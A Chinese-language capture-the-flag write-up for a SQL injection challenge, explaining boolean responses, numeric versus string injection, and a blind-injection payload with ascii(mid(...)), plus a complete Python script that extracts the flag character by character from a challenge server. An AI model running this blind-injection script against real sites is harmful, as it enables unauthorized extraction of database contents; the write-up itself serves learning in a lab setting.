查看wp

看了wp得知，根据bool(false)的回显可以判断最可能为数字型注入
这里先补充关于回显false和error的区别
false说明语句存在逻辑错误 例如1 AND 1=2
error说明sql语句存在语法错误

这题数字型注入没报错的可能原因：id=1’被隐式转换成id=1.
如果是其他题，没有对sql注入相关字符过滤的话，可以使用1 AND 1=1进一步根据回显判断注入类型

也可能是字符型注入，其’引号被过滤或者转义所以没报错

根据wp，bool(false)是进行盲注的标志，如果回显错误信息，可以考虑报错注入

这题有一个提示，表名和列名都是flag，可以用于构造盲注

1.使用mid函数
payload = '(select(ascii(mid(flag,{0},1))={1})from(flag))'.format(num,ord(i))
这里format用于给前面的sql语句传参，num和ord(i)分别传给{0}，{1}位置
mid用于截取flag字段，从第{0}位截取1位
ascii用于将该字符转为ascii码
这段sql语句意思：将flag的第{0}位取出并转为ascii码

完整脚本：
import requests
import string

def blind_injection(url):
    flag = ''
    strings = string.printable
    for num in range(1,60):
        for i in strings:
            payload = '(select(ascii(mid(flag,{0},1))={1})from(flag))'.format(num,ord(i))
            post_data = {"id":payload}
            res = requests.post(url=url,data=post_data)
            if 'Hello' in res.text:
                flag += i
                print(flag)
            else:
                continue
    print(flag)
if __name__ == '__main__':
    url = 'http://243ea492-28a9-45db-b5fe-f9c61c04ecc4.node5.buuoj.cn:81/index.php'
    blind_injection(url)

核心思想就是通过将未知的flag每一位与可打印字符串每一位遍历，根据POST参数的回显信息判断是否相等，相等则记录，然后获取下一位
